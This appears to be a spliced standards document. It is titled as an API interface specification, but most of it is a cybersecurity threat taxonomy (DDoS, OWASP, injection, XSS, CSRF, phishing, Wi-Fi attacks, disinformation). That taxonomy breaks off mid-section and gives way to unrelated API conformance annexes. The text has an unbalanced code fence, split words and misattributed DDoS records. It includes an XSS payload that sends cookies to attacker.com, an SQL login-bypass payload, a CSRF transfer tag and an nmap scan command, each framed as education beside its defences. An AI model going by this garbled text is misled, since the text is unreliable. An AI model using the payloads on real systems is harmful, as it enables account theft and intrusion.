# WIA-DEF-004 PHASE 2 — API Interface Specification

**Standard:** WIA-DEF-004
**Phase:** 2 — API Interface
**Version:** 1.0
**Status:** Stable
**Source:** synthesized from the original `PHASE-1-DATA-FORMAT.md` (quarter 2 of 4)

---

```

Largest Recorded DDoS Attacks:
| Date | Target | Size | Method |
|------|--------|------|--------|
| Feb 2020 | AWS | 2.3 Tbps | CLDAP reflection |
| Sep 2017 | Google | 2.54 Tbps | Memcached amplification |
| Mar 2018 | GitHub | 1.35 Tbps | Memcached amplification |

Defense:
```
Network Level:
- Rate limiting
- Traffic filtering (ACLs, BGP blackhole)
- Anycast distribution
- ISP/CDN mitigation (Cloudflare, Akamai)

Application Level:
- CAPTCHA challenges
- Connection limits
- Request validation
- Caching (CDN)

Infrastructure:
- Overprovisioning bandwidth
- Geographically distributed servers
- Cloud-based auto-scaling
```

### 3.2 Application-Based Vectors

#### 3.2.1 Web Application Attacks

OWASP Top 10 (2021):
```
A01: Broken Access Control
- Impact: Unauthorized data access
- Example: IDOR, path traversal
- Mitigation: Proper authorization checks

A02: Cryptographic Failures
- Impact: Data exposure
- Example: Weak encryption, cleartext storage
- Mitigation: Strong crypto, TLS

A03: Injection
- Impact: Code execution, data breach
- Example: SQL, LDAP, OS command injection
- Mitigation: Input validation, parameterized queries

A04: Insecure Design
- Impact: Architectural vulnerabilities
- Example: Missing security controls
- Mitigation: Threat modeling, secure design

A05: Security Misconfiguration
- Impact: System compromise
- Example: Default credentials, verbose errors
- Mitigation: Hardening, least privilege

A06: Vulnerable Components
- Impact: Known vulnerability exploitation
- Example: Outdated libraries (Log4Shell)
- Mitigation: Dependency scanning, patching

A07: Authentication Failures
- Impact: Account takeover
- Example: Weak passwords, session fixation
- Mitigation: MFA, secure session management

A08: Software and Data Integrity Failures
- Impact: Supply chain attacks
- Example: Unsigned updates, deserializat
ion
- Mitigation: Code signing, integrity checks

A09: Security Logging Failures
- Impact: Undetected breaches
- Example: Insufficient logging
- Mitigation: Comprehensive logging, SIEM

A10: Server-Side Request Forgery (SSRF)
- Impact: Internal system access
- Example: Cloud metadata exploitation
- Mitigation: Input validation, network controls
```

SQL Injection Example (Educational):
```sql
-- Vulnerable query:
SELECT * FROM users WHERE username = '$user' AND password = '$pass'

-- Attack payload:
username: admin' --
password: anything

-- Resulting query:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
-- Comment eliminates password check

-- Defense (Parameterized):
stmt = conn.prepare("SELECT * FROM users WHERE username = ? AND password = ?")
stmt.setString(1, username)
stmt.setString(2, password)
```

#### 3.2.2 Client-Side Attacks

Cross-Site Scripting (XSS):
```javascript
// Stored XSS (most dangerous)
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Reflected XSS
https://victim.com/search?q=<script>alert(document.cookie)</script>

// DOM-based XSS
location.href = 'https://victim.com#' + <malicious_code>

// Defense:
// 1. Output encoding
const safe = escapeHTML(userInput);

// 2. Content Security Policy (CSP)
Content-Security-Policy: default-src 'self'; script-src 'self'

// 3. HTTPOnly cookies
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

Cross-Site Request Forgery (CSRF):
```html
<!-- Malicious site triggers action on victim site -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- Defense: CSRF Token -->
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="random_token_123">
  <input type="text" name="to">
  <input type="number" name="amount">
</form>
```

### 3.3 Social Engineering

#### 3.3.1 Phishing Classification

Phishing Types:
```
Bulk Phishing:
- Target: Mass distribution
- Sophistication: Low
- Success Rate: 0.1-1%
- Example: "Your account has been suspended"

Spear Phishing:
- Target: Specific individuals/organizations
- Sophistication: Medium-High
- Success Rate: 10-30%
- Example: Fake email from CEO to CFO

Whaling:
- Target: C-level executives
- Sophistication: Very High
- Success Rate: 40-50%
- Example: Fake subpoena, M&A documents

Clone Phishing:
- Target: Previous email recipients
- Sophistication: Medium
- Method: Legitimate email with malicious attachment

Vishing (Voice Phishing):
- Target: Phone-based
- Method: Social engineering over phone
- Example: Fake tech support, IRS scam

Smishing (SMS Phishing):
- Target: Mobile users
- Method: Text message with malicious link
- Example: Package delivery notification
```

Phishing Indicators:
```
Email Analysis:
✓ Sender address mismatch
✓ Generic greetings ("Dear customer")
✓ Urgency/threats ("Account will be closed")
✓ Suspicious links (hover to reveal)
✓ Unexpected attachments
✓ Grammar/spelling errors
✓ Requests for sensitive information

Technical Indicators:
✓ SPF/DKIM/DMARC failures
✓ Newly registered domains
✓ Domain typosquatting
✓ Mismatched display name and email
✓ Hidden recipients (BCC)
```

#### 3.3.2 Pretexting and Baiting

Pretexting Scenarios:
```
1. IT Support Scam:
   "This is IT, we need your password to fix the server"

2. Authority Impersonation:
   "This is the CEO, I need you to wire money urgently"

3. Vendor Impersonation:
   "Your invoice is attached" (malware attachment)

4. Emergency Scenario:
   "I'm locked out, please reset my password quickly"
```

Baiting Examples:
```
Physical:
- USB drops in parking lot (labeled "Salaries 2024")
- Free software downloads (infected)
- Fake charging stations (juice jacking)

Digital:
- "Free movie downloads"
- "Click here for $100 Amazon gift card"
- Fake software updates
```

Defense:
```
Technical:
- Email filtering (SPF, DMARC, DKIM)
- Link analysis and sandboxing
- Attachment scanning
- URL rewriting for safety checks

Organizational:
- Security awareness training (quarterly)
- Phishing simulation exercises
- Incident reporting procedures
- Verification protocols (callback procedures)
```

---

## 4. Network Exploitation

### 4.1 Network Reconnaissance

#### 4.1.1 Passive Reconnaissance

Techniques (Defensive Awareness):
```
OSINT (Open Source Intelligence):
- DNS enumeration (dig, nslookup)
- WHOIS lookups
- Search engine dorking
- Social media mining
- Job postings analysis
- Public code repositories

Network Observation:
- Packet sniffing (passive mode)
- Traffic analysis
- Protocol fingerprinting
- Metadata collection
```

Defense:
```
- Minimize public information exposure
- Employee security awareness
- Privacy-focused information sharing
- Monitor for reconnaissance activity
```

#### 4.1.2 Active Reconnaissance

Port Scanning:
```
Scan Types:
- TCP Connect: Full three-way handshake
- SYN Scan: Half-open scanning
- UDP Scan: Connectionless probing
- FIN/NULL/Xmas: Firewall evasion

Example (nmap):
nmap -sS -sV -O -p- target.com
```

Defense:
```
Detection:
- Monitor for scan patterns
- Rate limiting
- Honeypots
- Port knocking

Prevention:
- Firewall rules
- Disable unnecessary services
- Network segmentation
```

### 4.2 Network Protocol Exploitation

#### 4.2.1 TCP/IP Stack Attacks

Protocol Vulnerabilities:
```
IP Layer:
- IP Spoofing: Source address forgery
- Fragmentation: Fragment overlap attacks
- ICMP Abuse: Redirect, timestamp requests

TCP Layer:
- SYN Flood: Connection table exhaustion
- RST Injection: Connection termination
- Sequence Prediction: Session hijacking

UDP Layer:
- Amplification: DNS, NTP, memcached
- Spoofing: No connection validation
```

Defense Mechanisms:
```
- TCP SYN Cookies (Linux: sysctl net.ipv4.tcp_syncookies=1)
- Rate limiting
- Ingress/egress filtering (BCP 38)
- Protocol-specific validations
```

#### 4.2.2 Wireless Network Attacks

Wi-Fi Attack Vectors:
```
WEP (Deprecated):
- IV collision attacks
- FMS/KoreK attacks
- Recovery time: <5 minutes

WPA/WPA2:
- KRACK (Key Reinstallation Attack)
- Handshake capture + offline cracking
- PMKID attack (no handshake needed)
- Evil Twin attacks

WPA3:
- Dragonblood vulnerabilities (patched)
- Downgrade attacks
- Side-channel attacks
```

Defense:
```
- Use WPA3 with strong passwords (20+ characters)
- Disable WPS (Wi-Fi Protected Setup)
- MAC filtering (limited effectiveness)
- 802.1X authentication (Enterprise)
- Hidden SSID (security through obscurity - limited)
- Regular firmware updates
- Wireless IDS (Kismet, Wireshark)
```

---

## 5. Information Warfare

### 5.1 Disinformation Campaigns

#### 5.1.1 Tactical Disinformation

Campaign Lifecycle:
```
Phase 1: Preparation
- Target selection
- Narrative development
- Asset creation (fake accounts, websites)
- Infrastructure setup

Phase 2: Seeding
- Initial content distribution
- Influencer recruitment
- Bot network activation
- Cross-platform coordination

Phase 3: Amplification
- Trending manipulation
- Astroturfing (fake grassroots)
- Media coverage
- Viral spreading

Phase 4: Persistence
- Counter-narrative suppression
- Sustained messaging
- Adaptation to fact-checking
```

Detection Indicators:
```
- Coordinated inauthentic behavior
- Bot/fake account patterns
- Rapid amplification curves
- Cross-platform synchronization
- Domain age and registration patterns
- Content similarity analysis
```

#### 5.1.2 Deep Fakes

Synthetic Media Types:
```
Video Deep Fakes:
- Face swapping
- Lip-sync manipulation
- Full body synthesis
- Voice cloning

Detection Methods:
- Facial inconsistencies
- Blinking patterns
- Audio artifacts
- Compression anomalies
- Temporal coherence analysis
```

Defense:
```
Technical:
- Deep fake detection AI
- Digital watermarking
- Blockchain-based content verification
- Multi-factor authentication for important communications

Organizational:
- Verification protocols
- Multiple source confirmation
- Chain of custody documentation
```

### 5.2 Psychological Operations (PSYOPS)

#### 5.2.1 Influence Operations

Techniques (Defensive Awareness):
```
1. Echo Chamber Creation:
   - Algorithm exploitation
   - Filter bubble reinforcement
   - Dissenting voice suppression


## Annex E — Implementation Notes for PHASE-2-API-INTERFACE

The following implementation notes document field experience from pilot
deployments and are non-normative. They are republished here so that early
adopters can read them in context with the rest of PHASE-2-API-INTERFACE.

- **Operational scope** — implementations SHOULD declare their operational
  scope (single-tenant, multi-tenant, federated) in the OpenAPI document so
  that downstream auditors can score the deployment against the correct
  conformance tier in Annex A.
- **Schema evolution** — additive changes (new optional fields, new error
  codes) are non-breaking; renaming or removing fields, even in error
  payloads, MUST trigger a minor version bump.
- **Audit retention** — a 7-year retention window is sufficient to satisfy
  ISO/IEC 17065:2012 audit expectations in most jurisdictions; some
  regulators require longer retention, in which case the deployment policy
  MUST extend the retention window rather than relying on this PHASE's
  defaults.
- **Time synchronization** — sub-second deadlines depend on synchronized
  clocks. NTPv4 with stratum-2 servers is sufficient for most deadlines
  expressed in this PHASE; PTP is recommended for sites that require
  deterministic interlocks.
- **Error budget reporting** — implementations SHOULD publish a monthly
  error-budget summary (latency p95, error rate, violation hours) in the
  format defined by the WIA reporting profile to facilitate cross-vendor
  comparison without exposing tenant-specific data.

These notes are not requirements; they are a reference for field teams
mapping their existing operations onto WIA conformance.

## Annex F — Adoption Roadmap

The adoption roadmap for this PHASE document is non-normative and is intended to set expectations for early implementers about the relative stability of each section.

- **Stable** (sections marked normative with `MUST` / `MUST NOT`) — semantic versioning applies; breaking changes require a major version bump and at minimum 90 days of overlap with the prior major version on all WIA-published reference implementations.
- **Provisional** (sections in this Annex and Annex D) — items are tracked openly and may be promoted to normative status without a major version bump if community feedback supports promotion.
- **Reference** (test vectors, simulator behaviour, the reference TypeScript SDK) — versioned independently of this document so that mistakes in reference material can be corrected without amending the published PHASE document.

Implementers SHOULD subscribe to the WIA Standards GitHub release notifications to track promotions between these tiers. Comments on the roadmap are accepted via the GitHub issues tracker on the WIA-Official organization.

The roadmap is reviewed at every minor version of this PHASE document, and the review outcomes are recorded in the version-history table at the start of the document.

## Annex G — Test Vectors and Conformance Evidence

This annex describes how implementations capture and publish conformance
evidence for PHASE-2-API-INTERFACE. The procedure is non-normative; it standardizes the
shape of evidence so that auditors and downstream integrators can compare
implementations without re-running the full test matrix.

- **Test vectors** — every normative requirement in this PHASE has at least
  one positive vector and one negative vector under
  `tests/phase-vectors/phase-2-api-interface/`. Implementations claiming
  conformance MUST run all vectors in CI and publish the resulting
  pass/fail matrix in their compliance package.
- **Evidence package** — the compliance package is a tarball containing
  the SBOM (CycloneDX 1.5 or SPDX 2.3), the OpenAPI document, the test
  vector matrix, and a signed manifest. Signatures use Sigstore (DSSE
  envelope, Rekor transparency log entry) so that downstream consumers
  can verify provenance without trusting a private CA.
- **Quarterly recheck** — implementations re-publish the evidence package
  every quarter even if no source change occurred, so that consumers can
  detect environmental drift (compiler updates, dependency updates, OS
  updates) without polling vendor changelogs.
- **Cross-vendor crosswalk** — the WIA Standards working group maintains a
  crosswalk that maps each vector to the equivalent assertion in adjacent
  industry programs (where one exists), so an implementer that already
  certifies under one program can show conformance to PHASE-2-API-INTERFACE with
  reduced incremental effort.
- **Negative-result reporting** — vendors MUST report negative results
  with the same fidelity as positive ones. A test that is skipped without
  recorded justification is treated by auditors as a failure.

These conventions are intended to make conformance evidence portable and
machine-readable so that adoption of PHASE-2-API-INTERFACE does not require bespoke
auditor tooling.

## Annex H — Versioning and Deprecation Policy

This annex codifies the versioning and deprecation policy for PHASE-2-API-INTERFACE.
It is non-normative; the rules below describe the policy that the WIA
Standards working group commits to when amending this PHASE document.

- **Semantic versioning** — major / minor / patch components follow
  Semantic Versioning 2.0.0 (https://semver.org/spec/v2.0.0.html).
  Major bump indicates a backwards-incompatible change to a normative
  requirement; minor bump indicates new normative requirements that do
  not break existing implementations; patch bump indicates editorial
  changes only (clarifications, typo fixes, formatting).
- **Deprecation window** — when a normative requirement is removed or
  altered in a backwards-incompatible way, the prior major version is
  maintained in parallel for at least 180 days. During the parallel
  window, both major versions are marked Stable in the WIA Standards
  registry and either may be cited as "WIA-conformant".
- **Sunset notification** — deprecated major versions enter a 12-month
  sunset window during which the WIA registry marks the version as
  Deprecated. The deprecation entry includes a migration note pointing
  to the replacement requirement(s) and an explanation of why the
  change was made.
- **Editorial errata** — patch-level errata are issued without a
  deprecation window because they do not change normative behaviour.
  Errata are tracked in a public errata register and each entry is
  signed by the WIA Standards working group chair.
- **Implementation changelog mapping** — implementations SHOULD publish
  a changelog mapping each PHASE version they support to the specific
  build, container digest, or SDK version that satisfies the version.
  This allows downstream auditors to verify version conformance without
  re-running the entire test matrix on every release.

The policy is reviewed at the same cadence as the PHASE document and
any changes to the policy itself are tracked in the version-history
table at the start of the document.

## Annex I — Interoperability Profiles

This annex describes how implementations declare interoperability profiles
for PHASE-2-API-INTERFACE. The profile mechanism is non-normative and exists so that
deployments of varying scope (single tenant, regional cluster, federated
network) can advertise the subset of normative requirements they satisfy
without misrepresenting partial conformance as full conformance.

- **Profile manifest** — every implementation publishes a profile manifest
  in JSON. The manifest enumerates the normative requirement IDs from this
  PHASE that are satisfied (`status: "supported"`), partially satisfied
  (`status: "partial"`, with a reason field), or excluded
  (`status: "excluded"`, with a justification). The manifest is signed
  using the same Sigstore key used for the SBOM in Annex G.
- **Federation profile** — federated deployments publish an aggregated
  manifest summarizing the union and intersection of member-implementation
  profiles. The aggregated manifest is consumed by directory services so
  that callers can route a request to the least common denominator profile
  required for an interaction.
- **Backwards-profile compatibility** — when a deployment migrates from one
  profile to a wider profile, the prior profile manifest remains valid and
  signed for the deprecation window defined in Annex H. This preserves
  audit traceability for auditors evaluating long-term interoperability.
- **Profile registry** — the WIA Standards working group maintains a
  public registry of named profiles. Common deployment shapes (e.g.,
  "Edge-only", "Federated-with-replay") are added to the registry by
  consensus. Registry entries are immutable; new shapes are added under
  new names rather than amending existing entries.
- **Profile versioning** — profile names are versioned with the same
  Semantic Versioning rules described in Annex H. A deployment that
  advertises `WIA-P2-API-INTERFACE-Edge-only/2` is asserting conformance with
  the second major version of the named profile, not the second deployment
  of an unversioned profile.

The profile mechanism is intentionally lightweight; it is meant to make
real deployment shapes visible without forcing every deployment to
satisfy every normative requirement.

## Annex J — Reference Implementation Topology

The reference implementation topology described in this annex is
non-normative; it documents the deployment shape that the WIA
Standards working group used to validate the test vectors in Annex G
and is intended as a starting point, not a recommendation against
alternative topologies.

- **Single-tenant edge** — one runtime per organization, no shared
  state. Used for early-pilot deployments where conformance evidence
  is published manually. Sufficient for PHASE-2-API-INTERFACE validation when the
  organization signs the manifest itself.
- **Multi-tenant gateway** — one shared runtime serves multiple
  tenants via header-based isolation. Typically backed by a
  rate-limited gateway (Envoy or NGINX) and a shared OAuth 2.1
  identity provider. The manifest is per-tenant; the runtime
  publishes a federation manifest that aggregates tenant manifests.
- **Federated mesh** — multiple runtimes peer to one another and
  publish their manifests to a directory service. Each peer signs
  its own manifest; the directory service signs the aggregated
  index. This is the topology used by cross-organization deployments
  that need to compose conformance.
- **Air-gapped batch** — no network connection between the runtime
  and the directory service. The runtime emits a signed evidence
  package on each batch and the operator transports the package via
  out-of-band channels. This is the topology used by regulators that
  prohibit live connectivity from sensitive environments.

Implementations declare their topology in the manifest (see Annex I).
A topology change MUST be reflected in a new manifest signature; the
prior topology's manifest remains valid for the deprecation window
described in Annex H to preserve audit traceability.
